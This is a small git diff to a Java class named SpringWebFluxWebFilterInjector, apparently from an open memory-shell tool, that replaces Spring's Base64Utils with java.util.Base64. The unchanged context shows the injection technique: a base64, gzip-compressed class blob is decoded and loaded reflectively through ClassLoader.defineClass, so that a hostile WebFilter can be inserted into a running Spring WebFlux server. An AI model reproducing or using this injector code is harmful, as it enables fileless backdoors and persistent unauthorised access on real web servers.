@@ -1,6 +1,5 @@
 package com.reajason.javaweb.memshell.injector.springwebflux;
 
-import org.springframework.util.Base64Utils;
 import org.springframework.web.server.WebFilter;
 import org.springframework.web.server.handler.DefaultWebFilterChain;
 import org.springframework.web.server.handler.FilteringWebHandler;
@@ -58,7 +57,7 @@ public class SpringWebFluxWebFilterInjector {
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(Base64Utils.decodeFromString(getBase64String()));
+            byte[] clazzByte = gzipDecompress(java.util.Base64.getDecoder().decode(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
